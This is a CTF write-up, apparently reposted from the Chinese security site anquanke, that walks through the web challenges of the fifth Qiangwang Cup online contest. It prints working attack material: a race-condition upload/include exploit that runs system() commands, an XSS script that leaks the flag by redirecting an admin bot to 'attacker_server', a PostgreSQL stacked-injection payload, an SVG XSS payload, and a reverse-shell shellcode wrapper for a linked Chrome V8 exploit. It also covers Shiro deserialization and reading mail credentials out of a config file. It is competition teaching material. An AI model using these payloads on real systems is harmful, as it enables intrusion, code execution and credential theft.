> 原文链接: https://www.anquanke.com//post/id/244945 


# 第五届强网杯线上赛 WriteUp - Web 篇


                                阅读量   
                                **148780**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t0127fdfdf5b5351cd1.jpg)](https://p2.ssl.qhimg.com/t0127fdfdf5b5351cd1.jpg)

## pop_master

题目 index.php 提供了反序列化的入口函数以及用户可控的函数参数，但是可使用的类很多至无法人工分析，按照每一个 class 节点两个分支来计算，共有近 2^30 个分支需要看，所以题目的考点很明显是自动化寻找 popchain。

相关的 paper 很多，但都不开源工具。在 github 寻找相关的工具，例如 [https://github.com/LoRexxar/Kunlun-M](https://github.com/LoRexxar/Kunlun-M) 需要对其做一定的修改（增加entry，设置结束条件，修改为深度优先搜索 #因为我们只需要一条链即可解题#）。

题目的预期解法应该是通过 ast 生成 cfg，然后检测净化操作进行剪枝，但是笔者观察代码比较规整，使用简单的正则表达式即可完成 taint 到剪枝的操作。具体思路是通过 index.php 的 entry 寻找其定义的位置，然后检查函数参数是否被净化处理(强制赋值)，如果没有则通过深度优先搜索，利用同样的操作处理这个函数中所调用的函数，直到找到一条路径通往 eval，同时函数参数没有被强净化。这里有一个比较 tricky 的处理方式，笔者观察到所有强净化操作的等号 “=” 与左值中间是没有空格的，弱净化操作是存在空格的，那么就不需要进行动态运算即可判断是否进行强净化。

最终代码如下：

```
import re

phpf = open('class.php').read()

 

popchain = []

#入口函数(entry)

start_func = 'public function SZB1zV'

func_split_aa = start_func

stop =0

#深度优先搜索

def check_santi(func_split):

    callee_class_preg_obj = re.findall(r'([a-zA-Z0-9\-\&gt;\$]*)\(([^\)]*)\)',phpf.split(func_split)[1].split("public function")[0], re.M|re.I)

    #匹配参数名

    arg = callee_class_preg_obj[0][1]

    #匹配代码块

    code_block = phpf.split(func_split)[1].split(" public function")[0]

    #强净化检测

    if arg+"=" in code_block:

        print("falied")

        return False

    else:

        callee_class_preg_obj = re.findall(r'([a-zA-Z0-9\-\&gt;\$]*)\(',phpf.split(func_split)[1].split("public function")[0], re.M|re.I)

        #遍历目标函数中所有被调用的函数

        for c in callee_class_preg_obj:

            if c=="":

                continue

            #eval函数

            if c == 'eval':

                print('eval!')

                stop =1

                return True

            #被调用的函数$this-&gt;member-&gt;funcname(xxx)

            if c[0] == '$':

                #当前的class name

                class_name = phpf.split(func_split)[0].split('class ')[-1].split('`{`')[0]

                #被调用函数对应的类赋值给当前类的哪个member

                current_class_member = c.split('-&gt;')[1]

                #被调用函数名

                func_split_n = "public function " + c.split('-&gt;')[2]

                #深度递归被调用函数

                if not check_santi(func_split_n):

                    continue

                print(func_split_n)

                #获取被调用函数所属的class name

                new_class_name = phpf.split(func_split_n)[0].split('class ')[-1].split('`{`')[0]

                #添加popchain节点

                popchain.append(`{`"name":class_name,"member":current_class_member,"new_class":new_class_name`}`)

                print(popchain)

                return True

 

check_santi(func_split_aa)

print("ok")

 

#生成popchain的php代码

gen_str = ""

last_class_name = popchain[0]['new_class']

cnt = 0

for i in popchain:

    if cnt == 0:

        gen_str += "$"+i["name"]+"test" +" = new "+i["name"]+"();"

        gen_str += "$"+i["name"]+"test-&gt;"+i["member"]+"= new "+last_class_name+"();"

        last_class_name = i["name"]

        cnt+=1

        continue

    gen_str += "$"+i["name"]+"test" +" = new "+i["name"]+"();"

    gen_str += "$"+i["name"]+"test-&gt;"+i["member"]+"= $"+last_class_name+"test;"

    last_class_name = i["name"]

 

print(gen_str)
```



## [强网先锋]赌徒

进行路径扫描获得 www.zip, 拿到题目源码，是一个简单的反序列化漏洞。可以构造反序列化链进行任意文件读取，直接读 flag, 得到两个脏字节 (hi)+base64 串，解开 base64 串即可获得 flag。

## [强网先锋]寻宝

第一步是简单的php弱类型游戏：

```
ppp[number1]=2022a&amp;ppp[number2]=8e9&amp;ppp[number3]=61823470&amp;ppp[number4]=0e12345&amp;ppp[number5]=abcd
```

拿到第一个key。

第二步是通过迅雷下载不稳定的题目附件，解压之后递归遍历一下 docx 内容，拿到第二个key。提交两个key获得flag。

## WhereIsUWebShell

通过构造畸形序列化字符串，绕过正则，获取源码。进行代码审计：

```
O:7:"myclass":1:`{`s:5:"hello";O:5:"Hello":2:`{`s:3:"qwb";s:36:"e2a7106f1cc8bb1e1318df70aa0a3540.php";`}``}`
```

[![](https://p3.ssl.qhimg.com/t010d32fae3e400eab0.jpg)](https://p3.ssl.qhimg.com/t010d32fae3e400eab0.jpg)<!--[endif]-->

通过 post 上传临时可以绕过二次渲染的马，getshell。可以利用 file_get_contents 来阻塞住进程，延长临时文件存在的时间。

```
# -*- coding: utf-8 -*-

import re

import sys

import requests

import threading

import time

 

image = open('evil.png', 'rb').read()

uploadImage = [('file', ('exp.png',

                         image,

                         'application/png'))]

 

proxies = `{`

    'http': '127.0.0.1:8080'

`}`

 

 

def upload():

    payload = `{``}`

    files = uploadImage

    headers = `{`

        'Cookie': 'ctfer=%4f%3a%37%3a%22%6d%79%63%6c%61%73%73%22%3a%32%3a%7b%73%3a%31%3a%22%61%22%3b%4f%3a%35%3a%22%48%65%6c%6c%6f%22%3a%32%3a%7b%73%3a%33%3a%22%71%77%62%22%3b%73%3a%32%35%3a%22%68%74%74%70%3a%2f%2f%38%31%2e%36%38%2e%31%37%30%2e%32%34%33%3a%32%33%33%33%22%3b%7d%73%3a%31%3a%22%62%22%3b%4f%3a%33%32%3a%22%65%32%61%37%31%30%36%66%31%63%63%38%62%62%31%65%31%33%31%38%64%66%37%30%61%61%30%61%33%35%34%30%22%3a%30%3a%7b%7d%7d'

    `}`

    response = requests.request("POST", url, headers=headers, data=payload, files=files, proxies=proxies)

    print(response.text)

 

 

def scanTmpDir():

    u = url + "/e2a7106f1cc8bb1e1318df70aa0a3540.php"

    param = `{`

        scan_param: '/tmp/',

    `}`

    while True:

        response1 = requests.get(u, params=param, allow_redirects=False)

        files = re.findall(r'php[a-zA-Z0-9]`{`6`}`', response1.text)

        if len(files) != 0:

            include(files)

 

 

def include(files):

    u = url + "/e2a7106f1cc8bb1e1318df70aa0a3540.php"

    for file in files:

        file = "/tmp/" + file

        param = `{`

            include_param: file,

            '1':"system('`{``}`');".format(command)

        `}`

        # print("including :", file)

        response = requests.get(u, params=param, proxies=proxies)

        print(response.text)

 

 

if __name__ == '__main__':

    if len(sys.argv) &lt; 3:

        print("py -3 exp.py url include_param scan_param command")

        exit()

    url = sys.argv[1]

    include_param = sys.argv[2]

    scan_param = sys.argv[3]

 

    command = sys.argv[4]

 

    attack = ""

 

    threading.Thread(target=upload).start()

    threading.Thread(target=scanTmpDir).start()
```

通过信息搜集，最后通过 bin 下的 文件获取 flag。

## EasyXSS

阅读 hint ，是要通过构造一个 xss 让 admin 去逐字节比较 flag， 一开始在 write 那找到了一个 xss 可以引入 &lt;base&gt; 标签，导入外部 js， 但是尝试 report 好像没触发，无果。在about 处又找到了一个 xss：

```
import requests

 

 

r = requests.Session()

 

#host = 'http://47.104.192.54:8888'

 

host = 'http://47.104.210.56:8888'

username = 'guesttest'

password = 'guesttest'

 

def register(host):

 

    url = f"`{`host`}`/register"

    res = r.post(url, data = `{`"username":username, "password":password`}`)

 

 

def login(host):

    url = f"`{`host`}`/login"

    res = r.post(url, data = `{`"username":username, "password":password`}`)

 

 

register(host)

login(host)

 

 

uuid_table = '-abcdef1234567890'

flag_str = 'flag`{`6bb77f8b-6bc8-4b9e-b654-8a4da'

flag_str = "flag`{`6bb77f8b-6bc8-4b9e-b654-8a4da5ae920"

while True:

 

    for i in uuid_table:

        flag = flag_str + i

        payload = 'http://localhost:8888/about?theme=%22;$.ajax(`{`url:%22/flag?var=' + flag + '%22,success:(data)=&gt;`{`location.href="http://attacker_server/?test"`}``}`);//'

        print(payload)

        url = f"`{`host`}`/report"

        res = r.post(url, `{`"url":payload`}`)

        import time

        time.sleep(6)

        with open("/var/log/apache2/access.log", "r") as f:

            data = f.read()

        import os

        os.system('echo "" &gt; /var/log/apache2/access.log')

        time.sleep(0.1)

        if 'test' in data:

            flag_str = flag

            print(flag_str)

            break
```



## EasySQL

题目源码：

```
const salt = random('Aa0', 40);

const HashCheck = sha256(sha256(salt + 'admin')).toString();

 

let filter = (data) =&gt; `{`

    let blackwords = ['alter', 'insert', 'drop', 'delete', 'update', 'convert', 'chr', 'char', 'concat', 'reg', 'to', 'query'];

    let flag = false;

 

    if (typeof data !== 'string') return true;

 

    blackwords.forEach((value, idx) =&gt; `{`

        if (data.includes(value)) `{`

            console.log(`filter: $`{`value`}``);

            return (flag = true);

        `}`

    `}`);

 

    let limitwords = ['substring', 'left', 'right', 'if', 'case', 'sleep', 'replace', 'as', 'format', 'union'];

    limitwords.forEach((value, idx) =&gt; `{`

        if (count(data, value) &gt; 3)`{`

            console.log(`limit: $`{`value`}``);

            return (flag = true);

        `}`

    `}`);

 

    return flag;

`}`

app.get('/source', async (req, res, next) =&gt; `{`

    fs.readFile('./source.txt', 'utf8', (err, data) =&gt; `{`

        if (err) `{`

            res.send(err);

        `}`

        else `{`

            res.send(data);

        `}`

    `}`);

`}`);

 

app.all('/', async (req, res, next) =&gt; `{`

    if (req.method == 'POST') `{`

        if (req.body.username &amp;&amp; req.body.password) `{`

            let username = req.body.username.toLowerCase();

            let password = req.body.password.toLowerCase();

 

            if (username === 'admin') `{`

                res.send(`&lt;script&gt;alert("Don't want this!!!");location.href='/';&lt;/script&gt;`);

                return;

            `}`

           

            UserHash = sha256(sha256(salt + username)).toString();

            if (UserHash !== HashCheck) `{`

                res.send(`&lt;script&gt;alert("NoNoNo~~~You are not admin!!!");location.href='/';&lt;/script&gt;`);

                return;

            `}`

 

            if (filter(password)) `{`

                res.send(`&lt;script&gt;alert("Hacker!!!");location.href='/';&lt;/script&gt;`);

                return;

            `}`

 

            let sql = `select password,username from users where username='$`{`username`}`' and password='$`{`password`}`';`;

            client.query(sql, [], (err, data) =&gt; `{`

                if (err) `{`

                    res.send(`&lt;script&gt;alert("Something Error!");location.href='/';&lt;/script&gt;`);

                    return;

                `}`

                else `{`

                    if ((typeof data !== 'undefined') &amp;&amp; (typeof data.rows[0] !== 'undefined') &amp;&amp; (data.rows[0].password === password)) `{`

                        res.send(`&lt;script&gt;alert("Congratulation,here is your flag:$`{`flag`}`");location.href='/';&lt;/script&gt;`);

                        return;

                    `}`

                    else `{`

                        res.send(`&lt;script&gt;alert("Password Error!!!");location.href='/';&lt;/script&gt;`);

                        return;

                    `}`

                `}`

            `}`);

        `}`

    `}`

 

    res.render('index');

    return;

`}`);
```

题目是一个看似 quine ([https://en.wikipedia.org/wiki/Quine_(computing)](https://en.wikipedia.org/wiki/Quine_(computing))) 的 sql 注入语句构造小游戏, 所谓quine就是代码或指令的内容与该代码/指令执行返回结果相同。本题是要构造注入语句与注入结果相同(password)。

首先需要通过对用户名的检测，既不能等于 “admin”，同时算出来的 hash 还要和 admin 相同，这里使用了 javascript 的小 trick：

[![](https://p1.ssl.qhimg.com/t018a22a60dfd81bf41.jpg)](https://p1.ssl.qhimg.com/t018a22a60dfd81bf41.jpg)<!--[endif]-->

通过 username[]=admin 即可绕过检测。

接下来就是对 password 这里 sql 注入的考量，首先题目设定了一些 waf 拦截了一些关键词以及限制了一些词的使用次数。

可以简单的对数据库类型进行探测，尝试了一些常用的 mysql 函数，发现不匹配(报错)，sqlite 函数也不匹配，最终定位成 pgsql。

然后通过 like 语句测试出 users 表是空表，那么很显然的解决方案:
<li>绕过 waf 进行 quine 的构造;
</li>
1. 通过堆叠注入向表中插入数据。
第一个方案对于 pgsql 来说很简单，pgsql 存在 current_query 或者一些系统表可以获取当前执行的语句，但是因为关键词次数的限制以及 union 不明原因无法正常使用(可能和对应的 pgsql 版本有关)，笔者放弃了。

最后通过 create function 建立一个可以执行任意 query 的函数，通过字符串翻转函数绕过 waf，执行 insert 插入数据。感觉可能是非预期解法。

[https://stackoverflow.com/questions/7433201/are-there-any-way-to-execute-a-query-inside-the-string-value-like-eval-in-post](https://stackoverflow.com/questions/7433201/are-there-any-way-to-execute-a-query-inside-the-string-value-like-eval-in-post)

```
create or replace function eval(expression text) returns integer
as
$body$
declare
  result integer;
begin
  execute expression;
  return 1;
end;
$body$
language plpgsql;
select eval(reverse(')''ass111'' ,''nimda''( seulav )drowssap ,emanresu( sresu otni tresni'));
commit;
```

最后一个问题，执行堆叠注入会导致 client.query 返回为空，使题目挂掉，因为执行了 commit 操作，所以可以在其后构造一些语法错误，让 err 有返回值：

```
&lt;?xml version="1.0"?&gt;&lt;?x
&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;
&lt;svg xmlns="http://www.w3.org/2000/svg"
 width="467" height="462"&gt;
  &lt;rect x="80" y="60" width="250" height="250" rx="20"
      style="fill:#ff0000; stroke:#000000;stroke-width:2px;" /&gt;
  
  &lt;rect x="140" y="120" width="250" height="250" rx="40"
      style="fill:#0000ff; stroke:#000000; stroke-width:2px;
      fill-opacity:0.7;" /&gt;
      &lt;animate onbegin='alert(1)' attributeName='x' dur='1s'&gt;&lt;/animate&gt;
&lt;/svg&gt;
```

## HarderXSS

通过对 UA 的分析，发现浏览器版本过低，因此使用 chrome 1day：<br>[https://github.com/dock0d1/Exploit-Google-Chrome-86.0.4240_V8_RCE/blob/main/exploit.js](https://github.com/dock0d1/Exploit-Google-Chrome-86.0.4240_V8_RCE/blob/main/exploit.js)

测试leak一下地址：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01315225c7abae0af5.jpg)<!--[endif]-->

然后构造反弹 shell 的 shellcode，使用下面的 js wrapper 进行转化替换掉原 exp 的 shellcode 即可：

```
var shellcode = "\x90\x90"; // replace with shellcode
while(shellcode.length % 4)
  shellcode += "\x90";
 
var buf = new ArrayBuffer(shellcode.length);
var arr = new Uint32Array(buf);
var u8_arr = new Uint8Array(buf);
 
for(var i=0;i&lt;shellcode.length;++i)
  u8_arr[i] = shellcode.charCodeAt(i);
 
console.log(arr);
```



## Hard_Penetration

Shiro 反序列化漏洞，默认 key，CommonsCollections 3.x 的利用链。shell 后发现读 flag 没有权限：

[![](https://p2.ssl.qhimg.com/t01d07e8ae7767b9aef.jpg)](https://p2.ssl.qhimg.com/t01d07e8ae7767b9aef.jpg)<!--[endif]-->

执行命令查看进程发现有个 root 权限启的 apache 进程，lsof/netstat 想看占用端口但权限不够，所以扫了下本机开放的端口，确定 apache 服务端口号是 8005。

通过对比指纹、信息收集，判定用的是通用系统 baocms，在 github 上找到一份源码：<br>[https://github.com/IsCrazyCat/demo-baocms-v17.1](https://github.com/IsCrazyCat/demo-baocms-v17.1)

审计之后，找到一个 php 文件包含的漏洞，由于 apache 是 root 权限，因此这个漏洞就能直接用来读 flag。

## Hard_APT_jeesite

题目环境用的是 jeesite，版本是 1.2.7。这个版本的 jeesite 理应有 shiro 反序列化漏洞，但使用工具扫了下常见的 shiro key，都不对，估计是 key 被手动改过或者 shiro 升级过。

根据题目提示，要尝试从 shiro 的配置文件中寻找关键信息。因此从网上下载 jeesite 1.2.7 的代码，进行审计后找到一个视图注入的漏洞，直接读 shiro 的配置文件，从配置文件的注释中找到邮箱配置信息：

[![](https://p4.ssl.qhimg.com/t013aaa4589c178d09f.jpg)](https://p4.ssl.qhimg.com/t013aaa4589c178d09f.jpg)<!--[endif]-->

直接登陆 qq 邮箱登不上，判断这里的 password 应该是 pop3 的连接口令。直接用 java commons-net 库里的 POP3Client 连接 qq 邮箱服务器，从邮件里读出 flag：

[![](https://p1.ssl.qhimg.com/t01d490fd63096e01ca.jpg)](https://p1.ssl.qhimg.com/t01d490fd63096e01ca.jpg)<!--[endif]-->

[![](https://p0.ssl.qhimg.com/t01b158fed92562abb5.jpg)](https://p0.ssl.qhimg.com/t01b158fed92562abb5.jpg)<!--[endif]-->

这里的 base64 解开就是 flag。
